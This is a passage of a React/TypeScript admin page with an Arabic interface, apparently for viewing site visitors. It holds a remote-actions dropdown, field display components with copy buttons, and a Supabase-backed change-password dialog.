      <DropdownMenuContent align="end" className="w-52">
        <DropdownMenuLabel className="text-xs">\u0623\u0648\u0627\u0645\u0631 \u0641\u0648\u0631\u064a\u0629 \u0639\u0628\u0631 Realtime</DropdownMenuLabel>
        <DropdownMenuSeparator />
        {REMOTE_ACTIONS.map((a) => {
          const t = toneClasses[a.tone];
          const isSending = sending === a.id;
          return (
            <DropdownMenuItem
              key={a.id}
              disabled={!!sending}
              onSelect={(e) => { e.preventDefault(); send(a.id); }}
              className="text-xs cursor-pointer"
            >
              <span className={`inline-flex items-center justify-center w-6 h-6 rounded-md ml-2 ${t.bg} ${t.text} border ${t.border}`}>
                {isSending ? <Loader2 className="w-3 h-3 animate-spin" /> : <span className="[&_svg]:w-3 [&_svg]:h-3">{a.icon}</span>}
              </span>
              {a.label}
            </DropdownMenuItem>
          );
        })}
      </DropdownMenuContent>
    </DropdownMenu>
  );
};


const Section = ({ title, children, full }: { title: string; children: React.ReactNode; full?: boolean }) => (
  <div className={`bg-background border border-border rounded-2xl p-5 ${full ? "md:col-span-2" : ""}`}>
    <h4 className="text-xs uppercase tracking-wider text-muted-foreground mb-3 pb-2 border-b border-border">
      {title}
    </h4>
    <div className="space-y-2.5 text-sm">{children}</div>
  </div>
);

const Field = ({
  label, value, icon: Icon, mono, copyable,
}: {
  label: string;
  value: string | null | undefined;
  icon?: React.ComponentType<{ className?: string }>;
  mono?: boolean;
  copyable?: boolean;
}) => {
  const [flash, setFlash] = useState(false);
  const [copied, setCopied] = useState(false);
  const prev = useRef<string | null | undefined>(undefined);
  useEffect(() => {
    if (prev.current !== undefined && prev.current !== value && value) {
      setFlash(true);
      const t = setTimeout(() => setFlash(false), 1700);
      prev.current = value;
      return () => clearTimeout(t);
    }
    prev.current = value;
  }, [value]);

  const handleCopy = async (e: React.MouseEvent) => {
    e.stopPropagation();
    if (!value) return;
    try {
      await navigator.clipboard.writeText(String(value));
      setCopied(true);
      toast({ title: "\u062a\u0645 \u0627\u0644\u0646\u0633\u062e", description: `${label}: ${value}` });
      setTimeout(() => setCopied(false), 1400);
    } catch {
      toast({ title: "\u0641\u0634\u0644 \u0627\u0644\u0646\u0633\u062e", variant: "destructive" });
    }
  };

  return (
    <div className="grid grid-cols-[110px_1fr] gap-3 items-start">
      <div className="flex items-center gap-1.5 text-xs text-muted-foreground pt-0.5">
        {Icon && <Icon className="w-3 h-3" />} {label}
      </div>
      <div className="flex items-center gap-1.5 min-w-0">
        <div className={`break-words px-1 -mx-1 flex-1 min-w-0 ${mono ? "font-mono text-xs" : ""} ${!value ? "text-muted-foreground/60 italic" : ""} ${flash ? "flash-update" : ""}`}>
          {value || "\u2014"}
        </div>
        {copyable && value && (
          <button
            type="button"
            onClick={handleCopy}
            aria-label={`\u0646\u0633\u062e ${label}`}
            className="shrink-0 inline-flex items-center justify-center w-6 h-6 rounded-md text-muted-foreground hover:text-foreground hover:bg-accent transition-colors"
          >
            {copied ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
          </button>
        )}
      </div>
    </div>
  );
};

/* ---------- Change password dialog ---------- */

const ChangePasswordDialog = ({
  open, onOpenChange,
}: { open: boolean; onOpenChange: (v: boolean) => void }) => {
  const [pw, setPw] = useState("");
  const [pw2, setPw2] = useState("");
  const [saving, setSaving] = useState(false);

  const reset = () => { setPw(""); setPw2(""); };

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (pw.length < 6) {
      toast({ title: "\u0643\u0644\u0645\u0629 \u0627\u0644\u0645\u0631\u0648\u0631 \u0642\u0635\u064a\u0631\u0629", description: "\u064a\u062c\u0628 \u0623\u0646 \u062a\u0643\u0648\u0646 6 \u0623\u062d\u0631\u0641 \u0639\u0644\u0649 \u0627\u0644\u0623\u0642\u0644.", variant: "destructive" });
      return;
    }
    if (pw !== pw2) {
      toast({ title: "\u0643\u0644\u0645\u062a\u0627 \u0627\u0644\u0645\u0631\u0648\u0631 \u063a\u064a\u0631 \u0645\u062a\u0637\u0627\u0628\u0642\u062a\u064a\u0646", variant: "destructive" });
      return;
    }
    setSaving(true);
    const { error } = await supabase.auth.updateUser({ password: pw });
    setSaving(false);
    if (error) {
      toast({ title: "\u062a\u0639\u0630\u0651\u0631 \u062a\u062d\u062f\u064a\u062b \u0643\u0644\u0645\u0629 \u0627\u0644\u0645\u0631\u0648\u0631", description: error.message, variant: "destructive" });
      return;
    }
    toast({ title: "\u062a\u0645 \u062a\u062d\u062f\u064a\u062b \u0643\u0644\u0645\u0629 \u0627\u0644\u0645\u0631\u0648\u0631 \u0628\u0646\u062c\u0627\u062d" });
    reset();
    onOpenChange(false);
  };

  return (
    <Dialog open={open} onOpenChange={(v) => { if (!v) reset(); onOpenChange(v); }}>
      <DialogContent dir="rtl" className="sm:max-w-md">
        <DialogHeader>
          <DialogTitle className="text-right">\u062a\u063a\u064a\u064a\u0631 \u0643\u0644\u0645\u0629 \u0627\u0644\u0645\u0631\u0648\u0631</DialogTitle>
          <DialogDescription className="text-right">
            \u0623\u062f\u062e\u0644 \u0643\u0644\u0645\u0629 \u0627\u0644\u0645\u0631\u0648\u0631 \u0627\u0644\u062c\u062f\u064a\u062f\u0629 \u0644\u062d\u0633\u0627\u0628 \u0627\u0644\u0623\u062f\u0645\u0646.
          </DialogDescription>
        </DialogHeader>
        <form onSubmit={submit} className="space-y-4">
          <div className="space-y-2">
            <Label htmlFor="new-pw">\u0643\u0644\u0645\u0629 \u0627\u0644\u0645\u0631\u0648\u0631 \u0627\u0644\u062c\u062f\u064a\u062f\u0629</Label>
            <Input id="new-pw" type="password" value={pw} onChange={(e) => setPw(e.target.value)} autoFocus />
          </div>
          <div className="space-y-2">
            <Label htmlFor="new-pw-2">\u062a\u0623\u0643\u064a\u062f \u0643\u0644\u0645\u0629 \u0627\u0644\u0645\u0631\u0648\u0631</Label>
            <Input id="new-pw-2" type="password" value={pw2} onChange={(e) => setPw2(e.target.value)} />
          </div>
          <DialogFooter className="gap-2 sm:gap-2">
            <Button type="button" variant="outline" onClick={() => onOpenChange(false)} disabled={saving}>
              \u0625\u0644\u063a\u0627\u0621
            </Button>
            <Button type="submit" disabled={saving}>
              {saving ? <Loader2 className="w-4 h-4 animate-spin ml-2" /> : null}
              \u062d\u0641\u0638
            </Button>
          </DialogFooter>
        </form>
      </DialogContent>
    </Dialog>
  );
};

export default AdminVisitors;
